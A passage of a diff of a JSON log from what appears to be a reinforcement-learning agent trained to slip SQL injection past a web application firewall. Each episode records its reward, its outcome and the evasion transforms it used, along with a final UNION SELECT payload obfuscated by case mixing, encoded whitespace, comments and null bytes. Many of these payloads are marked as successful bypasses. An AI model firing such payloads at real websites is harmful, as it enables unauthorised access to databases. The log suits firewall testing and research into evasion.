-      "vtab",
-      "newline",
-      "formfeed",
-      "paren_space",
-      "comment",
-      "vtab"
-    ],
-    "final_payload": "0'/**/uniON(SELECT/**/(1),(2),(3;%00))"
-  },
-  {
-    "episode": 128,
     "steps": 2,
     "total_reward": 7.76,
     "success": true,
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUNiOn%0asELECt%0a1,2,3;%00"
+    "final_payload": "0'%0cUNioN%0cseleCT%0c1,2,3;%00"
+  },
+  {
+    "episode": 128,
+    "steps": 4,
+    "total_reward": 3.2,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "vtab",
+      "crlf",
+      "comment",
+      "case"
+    ],
+    "final_payload": "0'%0bUnION%0bseLecT%0b1,2,3;%00"
   },
   {
     "episode": 129,
@@ -3046,9 +3019,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0auniOn%0aSelEct%0a1,2,3;%00"
+    "final_payload": "0'%0cunioN%0cSELEct%0c1,2,3;%00"
   },
   {
     "episode": 130,
@@ -3058,9 +3031,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUNion%0aSElecT%0a1,2,3;%00"
+    "final_payload": "0'%0cuniOn%0csELeCT%0c1,2,3;%00"
   },
   {
     "episode": 131,
@@ -3070,9 +3043,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aunIoN%0aSelecT%0a1,2,3;%00"
+    "final_payload": "0'%0cuniON%0cseLeCt%0c1,2,3;%00"
   },
   {
     "episode": 132,
@@ -3082,21 +3055,34 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aunIOn%0aSELEct%0a1,2,3;%00"
+    "final_payload": "0'%0cUNIoN%0cSeLeCT%0c1,2,3;%00"
   },
   {
     "episode": 133,
-    "steps": 2,
-    "total_reward": 7.76,
-    "success": true,
-    "final_result": "SUCCESS",
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
     "sequence": [
       "case",
-      "newline"
+      "hash_nl_all",
+      "newline",
+      "comment",
+      "crlf",
+      "comment",
+      "comment",
+      "newline",
+      "vtab",
+      "comment",
+      "crlf",
+      "comment",
+      "backtick",
+      "comment",
+      "unhex_wrap"
     ],
-    "final_payload": "0'%0aUnIon%0aSELeCT%0a1,2,3;%00"
+    "final_payload": "0'%23aa%0AUnION%23aa%0ASELeCt%23aa%0A1,2,3;%00"
   },
   {
     "episode": 134,
@@ -3106,46 +3092,34 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0auNIoN%0aSElECt%0a1,2,3;%00"
+    "final_payload": "0'%0cUnION%0cSEleCT%0c1,2,3;%00"
   },
   {
     "episode": 135,
-    "steps": 15,
-    "total_reward": -39.6,
-    "success": false,
-    "final_result": "WAF_BLOCKED",
-    "sequence": [
-      "hash_nl_all",
-      "vtab",
-      "comment",
-      "double_encode",
-      "comment",
-      "case",
-      "hex_encode",
-      "double_and",
-      "paren_space",
-      "ver_12345",
-      "paren_full",
-      "comment",
-      "crlf",
-      "comment",
-      "vtab"
-    ],
-    "final_payload": "0'%23xx%0AuNiOn%23xx%0AseLecT%23xx%0A1,2,3;%00"
-  },
-  {
-    "episode": 136,
     "steps": 2,
     "total_reward": 7.76,
     "success": true,
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUnIoN%0aseLect%0a1,2,3;%00"
+    "final_payload": "0'%0cuniON%0cSELecT%0c1,2,3;%00"
+  },
+  {
+    "episode": 136,
+    "steps": 3,
+    "total_reward": 5.52,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case",
+      "paren_full",
+      "vtab"
+    ],
+    "final_payload": "0'%0bUNIoN%0bSeLECt%0b1,2,3;%00"
   },
   {
     "episode": 137,
@@ -3155,9 +3129,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aunioN%0aSeLect%0a1,2,3;%00"
+    "final_payload": "0'%0cuniOn%0cSElECT%0c1,2,3;%00"
   },
   {
     "episode": 138,
@@ -3167,9 +3141,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUNiOn%0aselecT%0a1,2,3;%00"
+    "final_payload": "0'%0cUNIOn%0cSelECT%0c1,2,3;%00"
   },
   {
     "episode": 139,
@@ -3179,46 +3153,46 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0auNioN%0aSeleCT%0a1,2,3;%00"
+    "final_payload": "0'%0cuNiOn%0cSeLECt%0c1,2,3;%00"
   },
   {
     "episode": 140,
-    "steps": 15,
-    "total_reward": -27.6,
-    "success": true,
-    "final_result": "SUCCESS",
-    "sequence": [
-      "double_and",
-      "crlf",
-      "formfeed",
-      "tab_space",
-      "crlf",
-      "crlf",
-      "formfeed",
-      "newline",
-      "vtab",
-      "newline",
-      "hash_nl_all",
-      "comment",
-      "double_encode",
-      "comment",
-      "case_split"
-    ],
-    "final_payload": "0'%0d%0auNIon%0d%0asELEct%0d%0a1,2,3;%00"
-  },
-  {
-    "episode": 141,
     "steps": 2,
     "total_reward": 7.76,
     "success": true,
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0auNion%0aSELecT%0a1,2,3;%00"
+    "final_payload": "0'%0cUNion%0cselEct%0c1,2,3;%00"
+  },
+  {
+    "episode": 141,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "convert_charset",
+      "vtab",
+      "vtab",
+      "newline",
+      "vtab",
+      "tab_space",
+      "paren_space",
+      "comment",
+      "tab_space",
+      "comment",
+      "hash_nl_all",
+      "comment",
+      "crlf",
+      "comment",
+      "vtab"
+    ],
+    "final_payload": "0'%0bUNION(SELECT/**/(1),(2),(3;%00))"
   },
   {
     "episode": 142,
@@ -3228,46 +3202,46 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUNIoN%0aSeleCT%0a1,2,3;%00"
+    "final_payload": "0'%0cunIon%0cSeLEcT%0c1,2,3;%00"
   },
   {
     "episode": 143,
-    "steps": 15,
-    "total_reward": -39.6,
-    "success": false,
-    "final_result": "WAF_BLOCKED",
-    "sequence": [
-      "char_split",
-      "tab_space",
-      "case",
-      "newline",
-      "plus_sep",
-      "comment",
-      "case",
-      "comment",
-      "case_split",
-      "comment",
-      "plus_sep",
-      "newline",
-      "vtab",
-      "comment",
-      "between_space"
-    ],
-    "final_payload": "0'%09/*U*//*N*//*I*//*O*//*N*/%09/*S*//*E*//*L*//*E*//*C*//*T*/%091,2,3;%00"
-  },
-  {
-    "episode": 144,
     "steps": 2,
     "total_reward": 7.76,
     "success": true,
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUnIon%0asElECt%0a1,2,3;%00"
+    "final_payload": "0'%0cuniON%0cseLECT%0c1,2,3;%00"
+  },
+  {
+    "episode": 144,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "hash_nl_all",
+      "tab_space",
+      "comment",
+      "vtab",
+      "comment",
+      "formfeed",
+      "comment",
+      "tab_space",
+      "comment",
+      "vtab",
+      "newline",
+      "newline",
+      "double_or",
+      "comment",
+      "crlf"
+    ],
+    "final_payload": "0'%23xx%0AUNION%23xx%0ASELECT%23xx%0A1,2,3;%00"
   },
   {
     "episode": 145,
@@ -3277,38 +3251,26 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUNion%0aselECT%0a1,2,3;%00"
+    "final_payload": "0'%0cunIon%0csELeCt%0c1,2,3;%00"
   },
   {
     "episode": 146,
-    "steps": 2,
-    "total_reward": 7.76,
-    "success": true,
-    "final_result": "SUCCESS",
-    "sequence": [
-      "case",
-      "newline"
-    ],
-    "final_payload": "0'%0aUNioN%0aseleCT%0a1,2,3;%00"
-  },
-  {
-    "episode": 147,
     "steps": 15,
     "total_reward": -39.6,
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "plus_sep",
-      "tab_space",
-      "newline",
-      "newline",
+      "between_space",
       "tab_space",
       "comment",
       "crlf",
       "comment",
-      "formfeed",
+      "vtab",
+      "comment",
+      "vtab",
+      "newline",
       "newline",
       "tab_space",
       "comment",
@@ -3316,19 +3278,44 @@
       "comment",
       "vtab"
     ],
-    "final_payload": "0'+UNION+SELECT+1,2,3;%00"
+    "final_payload": "0'%a0UNION%a0SELECT%a01,2,3;%00"
   },
   {
-    "episode": 148,
+    "episode": 147,
     "steps": 2,
     "total_reward": 7.76,
     "success": true,
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aunioN%0aSElECt%0a1,2,3;%00"
+    "final_payload": "0'%0cuNiON%0cSElECt%0c1,2,3;%00"
+  },
+  {
+    "episode": 148,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "hash_nl",
+      "crlf",
+      "comment",
+      "between_space",
+      "comment",
+      "plus_sep",
+      "comment",
+      "crlf",
+      "comment",
+      "formfeed",
+      "double_or",
+      "comment",
+      "vtab",
+      "comment",
+      "formfeed"
+    ],
+    "final_payload": "0'%0d%0aUNION%23sqli%0ASELECT%0d%0a1,2,3;%00"
   },
   {
     "episode": 149,
@@ -3338,9 +3325,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUNiON%0aSelEct%0a1,2,3;%00"
+    "final_payload": "0'%0cUnIon%0cSElEct%0c1,2,3;%00"
   },
   {
     "episode": 150,
@@ -3350,21 +3337,22 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0auNION%0asELEcT%0a1,2,3;%00"
+    "final_payload": "0'%0cuniON%0cSElECT%0c1,2,3;%00"
   },
   {
     "episode": 151,
-    "steps": 2,
-    "total_reward": 7.76,
+    "steps": 3,
+    "total_reward": 5.52,
     "success": true,
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "distinct",
+      "tab_space"
     ],
-    "final_payload": "0'%0auNION%0aSELect%0a1,2,3;%00"
+    "final_payload": "0'%09UnIoN%09DISTINCTROW%09SeLECt%091,2,3;%00"
   },
   {
     "episode": 152,
@@ -3373,23 +3361,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "hash_nl",
-      "tab_space",
-      "comment",
-      "tab_space",
-      "comment",
+      "case",
+      "hash_nl_all",
       "crlf",
+      "newline",
+      "newline",
+      "tab_space",
+      "newline",
       "comment",
       "vtab",
-      "paren_space",
-      "tab_space",
+      "hash_nl",
       "comment",
-      "tab_space",
+      "between_space",
       "comment",
-      "double_or",
-      "comment"
+      "between_space",
+      "case"
     ],
-    "final_payload": "0'%09UNION%23sqli%0ASELECT%091,2,3;%00"
+    "final_payload": "0'%23xx%0AUNIoN%23xx%0ASeLeCt%23xx%0A1,2,3;%00"
   },
   {
     "episode": 153,
@@ -3399,9 +3387,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUNiON%0aseLEcT%0a1,2,3;%00"
+    "final_payload": "0'%0cunIOn%0csELECt%0c1,2,3;%00"
   },
   {
     "episode": 154,
@@ -3411,9 +3399,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0auNion%0aSELecT%0a1,2,3;%00"
+    "final_payload": "0'%0cuNioN%0csELECT%0c1,2,3;%00"
   },
   {
     "episode": 155,
@@ -3423,9 +3411,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aunioN%0aSELect%0a1,2,3;%00"
+    "final_payload": "0'%0cunioN%0cSElECt%0c1,2,3;%00"
   },
   {
     "episode": 156,
@@ -3435,9 +3423,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUNiOn%0aSElEcT%0a1,2,3;%00"
+    "final_payload": "0'%0cUniOn%0cselEct%0c1,2,3;%00"
   },
   {
     "episode": 157,
@@ -3447,9 +3435,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0auNIoN%0aSeLeCT%0a1,2,3;%00"
+    "final_payload": "0'%0cunION%0cseleCt%0c1,2,3;%00"
   },
   {
     "episode": 158,
@@ -3459,9 +3447,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUNiON%0aSeleCT%0a1,2,3;%00"
+    "final_payload": "0'%0cuNION%0cSElecT%0c1,2,3;%00"
   },
   {
     "episode": 159,
@@ -3471,9 +3459,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0auNION%0asELecT%0a1,2,3;%00"
+    "final_payload": "0'%0cunION%0cseLECT%0c1,2,3;%00"
   },
   {
     "episode": 160,
@@ -3483,47 +3471,33 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0auNION%0aSEleCt%0a1,2,3;%00"
+    "final_payload": "0'%0cuNIOn%0cSElEcT%0c1,2,3;%00"
   },
   {
     "episode": 161,
-    "steps": 3,
-    "total_reward": 5.52,
+    "steps": 2,
+    "total_reward": 7.76,
     "success": true,
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "hex_encode",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUnioN%0asELECT%0a0x31,0x32,0x33;%00"
+    "final_payload": "0'%0cUNiOn%0cSEleCt%0c1,2,3;%00"
   },
   {
     "episode": 162,
-    "steps": 15,
-    "total_reward": -39.6,
-    "success": false,
-    "final_result": "WAF_BLOCKED",
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "ver_12345",
-      "tab_space",
-      "comment",
-      "comment",
-      "newline",
-      "comment",
-      "comment",
-      "hash_nl",
-      "comment",
-      "comment",
-      "newline",
-      "comment",
-      "comment",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%09/*!12345UNioN%23xyz%0ASeLEct*/%091,2,3;%00"
+    "final_payload": "0'%0cuNIon%0csElect%0c1,2,3;%00"
   },
   {
     "episode": 163,
@@ -3533,9 +3507,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0auNION%0aSeLECt%0a1,2,3;%00"
+    "final_payload": "0'%0cuNioN%0cSELEcT%0c1,2,3;%00"
   },
   {
     "episode": 164,
@@ -3545,9 +3519,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0auNion%0aSeLect%0a1,2,3;%00"
+    "final_payload": "0'%0cUniON%0cseleCt%0c1,2,3;%00"
   },
   {
     "episode": 165,
@@ -3556,23 +3530,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "unhex_wrap",
-      "url_encode",
-      "crlf",
-      "comment",
-      "plus_sep",
-      "comment",
+      "double_encode",
       "newline",
       "comment",
+      "double_encode",
+      "comment",
+      "case",
+      "comment",
+      "vtab",
+      "newline",
       "nested_and",
       "comment",
-      "tab_space",
-      "char_split",
-      "nested_and",
+      "vtab",
       "comment",
-      "tab_space"
+      "vtab",
+      "newline"
     ],
-    "final_payload": "0'%0d%0a%55NION%0d%0a%53ELECT%0d%0a1,2,3;%00"
+    "final_payload": "0'%2520UNIon%2520SeLect%25201,2,3;%00"
   },
   {
     "episode": 166,
@@ -3582,9 +3556,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0auniON%0asElECt%0a1,2,3;%00"
+    "final_payload": "0'%0cuniON%0csElecT%0c1,2,3;%00"
   },
   {
     "episode": 167,
@@ -3594,9 +3568,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aunIoN%0aseLEcT%0a1,2,3;%00"
+    "final_payload": "0'%0cunION%0cSELEct%0c1,2,3;%00"
   },
   {
     "episode": 168,
@@ -3606,34 +3580,22 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aunIon%0aSeLEct%0a1,2,3;%00"
+    "final_payload": "0'%0cUnION%0cSElEcT%0c1,2,3;%00"
   },
   {
     "episode": 169,
-    "steps": 15,
-    "total_reward": -39.6,
-    "success": false,
-    "final_result": "WAF_BLOCKED",
+    "steps": 3,
+    "total_reward": 5.52,
+    "success": true,
+    "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "hash_nl",
-      "crlf",
-      "comment",
-      "case_split",
-      "comment",
-      "vtab",
-      "comment",
-      "formfeed",
-      "comment",
-      "formfeed",
-      "newline",
-      "crlf",
-      "newline",
+      "paren_full",
       "vtab"
     ],
-    "final_payload": "0'%0d%0auNiOn%23foo%0AseLect%0d%0a1,2,3;%00"
+    "final_payload": "0'%0buNion%0bsElect%0b1,2,3;%00"
   },
   {
     "episode": 170,
@@ -3643,9 +3605,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUNioN%0asElect%0a1,2,3;%00"
+    "final_payload": "0'%0cUNion%0cSeLecT%0c1,2,3;%00"
   },
   {
     "episode": 171,
@@ -3655,9 +3617,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aunIOn%0aseleCT%0a1,2,3;%00"
+    "final_payload": "0'%0cuniON%0cSElECT%0c1,2,3;%00"
   },
   {
     "episode": 172,
@@ -3667,9 +3629,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0auNiON%0asELect%0a1,2,3;%00"
+    "final_payload": "0'%0cuNion%0csElecT%0c1,2,3;%00"
   },
   {
     "episode": 173,
@@ -3679,9 +3641,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "crlf"
     ],
-    "final_payload": "0'%0auNIoN%0aSelEct%0a1,2,3;%00"
+    "final_payload": "0'%0d%0auniON%0d%0aSELecT%0d%0a1,2,3;%00"
   },
   {
     "episode": 174,
@@ -3691,34 +3653,21 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0auNIOn%0asELECt%0a1,2,3;%00"
+    "final_payload": "0'%0cuNIOn%0cselecT%0c1,2,3;%00"
   },
   {
     "episode": 175,
-    "steps": 15,
-    "total_reward": -39.6,
-    "success": false,
-    "final_result": "WAF_BLOCKED",
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "double_and",
-      "hash_nl_all",
-      "comment",
-      "url_encode",
-      "nested_or",
-      "comment",
-      "between_space",
-      "comment",
-      "between_space",
-      "comment",
-      "plus_sep",
-      "comment",
-      "formfeed",
-      "comment"
+      "formfeed"
     ],
-    "final_payload": "0'%23xx%0AunIOn%23xx%0AsEleCT%23xx%0A1,2,3;%00"
+    "final_payload": "0'%0cUniOn%0cSelecT%0c1,2,3;%00"
   },
   {
     "episode": 176,
@@ -3727,44 +3676,35 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "between_space",
+      "case",
+      "nested_union",
+      "comment",
+      "double_encode",
+      "newline",
       "formfeed",
-      "comment",
+      "newline",
       "between_space",
-      "tab_space",
-      "comment",
-      "vtab",
-      "comment",
-      "formfeed",
-      "comment",
-      "vtab",
-      "comment",
+      "newline",
       "crlf",
-      "comment",
-      "vtab"
+      "newline",
+      "vtab",
+      "newline",
+      "newline",
+      "tab_space"
     ],
-    "final_payload": "0'%a0UNION%a0SELECT%a01,2,3;%00"
+    "final_payload": "0'/**/uniON/**/seLeCT/**/1,2,3;%00"
   },
   {
     "episode": 177,
-    "steps": 11,
-    "total_reward": -15.28,
+    "steps": 2,
+    "total_reward": 7.76,
     "success": true,
     "final_result": "SUCCESS",
     "sequence": [
-      "vtab",
-      "vtab",
-      "between_space",
-      "tab_space",
-      "formfeed",
-      "newline",
-      "vtab",
-      "crlf",
-      "crlf",
-      "newline",
-      "case"
+      "case",
+      "formfeed"
     ],
-    "final_payload": "0'%0bUNIOn%0bsELEcT%0b1,2,3;%00"
+    "final_payload": "0'%0cUnIoN%0cSelECT%0c1,2,3;%00"
   },
   {
     "episode": 178,
@@ -3774,9 +3714,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aunIOn%0aSElect%0a1,2,3;%00"
+    "final_payload": "0'%0cUNiOn%0cSelecT%0c1,2,3;%00"
   },
   {
     "episode": 179,
@@ -3785,23 +3725,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "case",
-      "url_encode",
-      "comment",
-      "case_split",
-      "newline",
-      "hex_encode",
-      "comment",
-      "comment",
-      "paren_full",
-      "comment",
-      "comment",
-      "hash_nl",
-      "comment",
+      "url_mid_char",
       "tab_space",
-      "comment"
+      "case",
+      "comment",
+      "case",
+      "comment",
+      "formfeed",
+      "newline",
+      "newline",
+      "comment",
+      "double_encode",
+      "comment",
+      "between_space",
+      "newline",
+      "double_or"
     ],
-    "final_payload": "0'/**/uNIon%23foo%0AseLect/**/0x31,0x32,0x33;%00"
+    "final_payload": "0'%09UN%49ON%09SEL%45CT%091,2,3;%00"
   },
   {
     "episode": 180,
@@ -3811,9 +3751,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aunioN%0aSeleCt%0a1,2,3;%00"
+    "final_payload": "0'%0cunION%0cselEct%0c1,2,3;%00"
   },
   {
     "episode": 181,
@@ -3823,9 +3763,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "tab_space"
     ],
-    "final_payload": "0'%0aUNIOn%0aSeleCt%0a1,2,3;%00"
+    "final_payload": "0'%09unIoN%09SELeCT%091,2,3;%00"
   },
   {
     "episode": 182,
@@ -3835,21 +3775,34 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUNIoN%0asElEcT%0a1,2,3;%00"
+    "final_payload": "0'%0cUnION%0csElect%0c1,2,3;%00"
   },
   {
     "episode": 183,
-    "steps": 2,
-    "total_reward": 7.76,
-    "success": true,
-    "final_result": "SUCCESS",
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
     "sequence": [
       "case",
-      "newline"
+      "nested_and",
+      "hash_nl_all",
+      "comment",
+      "double_encode",
+      "comment",
+      "formfeed",
+      "newline",
+      "newline",
+      "tab_space",
+      "newline",
+      "crlf",
+      "comment",
+      "plus_sep",
+      "comment"
     ],
-    "final_payload": "0'%0aUNion%0aseLeCt%0a1,2,3;%00"
+    "final_payload": "0'%23xx%0AUniON%23xx%0AsELeCt%23xx%0A1,2,3;%00"
   },
   {
     "episode": 184,
@@ -3859,9 +3812,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUniON%0aSeLECt%0a1,2,3;%00"
+    "final_payload": "0'%0cunIOn%0csEleCt%0c1,2,3;%00"
   },
   {
     "episode": 185,
@@ -3871,9 +3824,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUnioN%0aSElEct%0a1,2,3;%00"
+    "final_payload": "0'%0cuniOn%0cSELEcT%0c1,2,3;%00"
   },
   {
     "episode": 186,
@@ -3883,9 +3836,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUnIoN%0asElEcT%0a1,2,3;%00"
+    "final_payload": "0'%0cuNIon%0cSelecT%0c1,2,3;%00"
   },
   {
     "episode": 187,
@@ -3895,9 +3848,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0auNIOn%0aSElECT%0a1,2,3;%00"
+    "final_payload": "0'%0cUNioN%0cseLeCt%0c1,2,3;%00"
   },
   {
     "episode": 188,
@@ -3907,9 +3860,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0auNioN%0asElecT%0a1,2,3;%00"
+    "final_payload": "0'%0cunIOn%0cselEct%0c1,2,3;%00"
   },
   {
     "episode": 189,
@@ -3919,59 +3872,71 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUNion%0asEleCt%0a1,2,3;%00"
+    "final_payload": "0'%0cuNION%0csELecT%0c1,2,3;%00"
   },
   {
     "episode": 190,
     "steps": 15,
-    "total_reward": -39.6,
+    "total_reward": -4.6,
     "success": false,
-    "final_result": "WAF_BLOCKED",
+    "final_result": "SQL_ERROR",
     "sequence": [
-      "formfeed",
-      "formfeed",
+      "case",
       "between_space",
-      "crlf",
-      "formfeed",
+      "comment",
+      "comment",
+      "comment",
+      "comment",
+      "comment",
       "paren_full",
       "comment",
-      "url_encode",
       "comment",
       "newline",
-      "ver_12345",
-      "newline",
+      "comment",
       "comment",
       "newline",
-      "newline"
+      "comment"
     ],
-    "final_payload": "0'%0c%55NION%0c%53ELECT%0c1,2,3;%00"
+    "final_payload": "0'%a0UniON%a0seLect%a01,2,3;%00"
   },
   {
     "episode": 191,
-    "steps": 3,
-    "total_reward": 5.52,
-    "success": true,
-    "final_result": "SUCCESS",
-    "sequence": [
-      "paren_full",
-      "newline",
-      "case"
-    ],
-    "final_payload": "0'%0aUniOn%0aseLEct%0a1,2,3;%00"
-  },
-  {
-    "episode": 192,
     "steps": 2,
     "total_reward": 7.76,
     "success": true,
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "tab_space"
+      "formfeed"
     ],
-    "final_payload": "0'%09unIoN%09seLect%091,2,3;%00"
+    "final_payload": "0'%0cUNIoN%0cSelECt%0c1,2,3;%00"
+  },
+  {
+    "episode": 192,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "case",
+      "param_pollute",
+      "newline",
+      "comment",
+      "comment",
+      "newline",
+      "hex_encode",
+      "comment",
+      "tab_space",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "newline",
+      "newline"
+    ],
+    "final_payload": "0'%0aUnIoN/*&q=*/seLeCT/*&q=*/1,2,3;%00"
   },
   {
     "episode": 193,
@@ -3981,21 +3946,23 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0auNioN%0aSeLect%0a1,2,3;%00"
+    "final_payload": "0'%0cUNiOn%0cseLect%0c1,2,3;%00"
   },
   {
     "episode": 194,
-    "steps": 2,
-    "total_reward": 7.76,
+    "steps": 4,
+    "total_reward": 3.2,
     "success": true,
     "final_result": "SUCCESS",
     "sequence": [
-      "case",
-      "newline"
+      "crlf",
+      "between_space",
+      "comment",
+      "case"
     ],
-    "final_payload": "0'%0aunION%0aSeLECT%0a1,2,3;%00"
+    "final_payload": "0'%0d%0aUnIoN%0d%0asELeCT%0d%0a1,2,3;%00"
   },
   {
     "episode": 195,
@@ -4004,36 +3971,23 @@
     "success": true,
     "final_result": "SUCCESS",
     "sequence": [
-      "case",
-      "nested_and",
-      "formfeed"
+      "formfeed",
+      "tab_space",
+      "case"
     ],
-    "final_payload": "0'%0cuNioN%0cSELecT%0c1,2,3;%00"
+    "final_payload": "0'%0cuNiON%0cSELeCT%0c1,2,3;%00"
   },
   {
     "episode": 196,
-    "steps": 15,
-    "total_reward": -39.6,
-    "success": false,
-    "final_result": "WAF_BLOCKED",
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
     "sequence": [
-      "plus_sep",
-      "crlf",
-      "comment",
-      "double_encode",
-      "comment",
       "case",
-      "plus_sep",
-      "newline",
-      "distinct",
-      "comment",
-      "crlf",
-      "newline",
-      "crlf",
-      "vtab",
-      "newline"
+      "formfeed"
     ],
